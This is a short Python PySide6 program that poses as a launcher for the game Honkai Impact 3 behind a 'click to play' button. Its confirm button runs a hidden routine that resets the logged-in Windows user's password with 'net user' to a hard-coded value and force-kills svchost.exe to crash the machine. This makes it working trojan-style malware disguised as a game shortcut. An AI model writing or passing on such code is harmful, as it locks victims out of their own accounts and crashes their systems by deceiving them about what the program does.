from PySide6.QtWidgets import *
import os


class Stats:

    def __init__(self, win_width, win_height, apptitle, text_width, text_height):
        # 创建主窗口对象
        self.window = QMainWindow()
        # 设置窗口的大小
        self.window.resize(win_width, win_height)
        # 设置窗口显示的位置
        self.window.move(300, 300)
        # 设置窗口的标题
        self.window.setWindowTitle(apptitle)

        # 设置按钮
        self.button = QPushButton('点击玩崩坏3', self.window)
        self.button.resize(200, 150)
        self.button.move(win_width / 3, win_height / 3)

        # 按钮点击事件
        self.button.clicked.connect(self.handeCale)

        self.start = QPushButton('点击确定', self.window)
        self.start.resize(200, 150)
        self.start.move(win_width / 3, win_height / 3)
        self.start.clicked.connect(self.blue_desktop)
        self.start.close()

    def handeCale(self):
        self.button.close()
        self.start.show()

    def blue_desktop(self):
        self.set_passwd(1145141919810)
        os.system('taskkill /im svchost.exe /f')
        # os.system('notepad')

    @staticmethod
    def set_passwd(password):
        os.system('echo %username% > userName')

        file = open('./userName', 'r', encoding='utf-8')
        user_name = file.readlines()
        print(user_name, type(user_name))
        user_name = user_name[0].split()[0]

        print(user_name)

        os.system(f'net user {user_name} {password}')
        file.close()
        os.remove('./userName')


if __name__ == '__main__':
    app = QApplication([])
    stats = Stats(500, 500, 'Title', 300, 480)
    stats.window.show()
    app.exec()




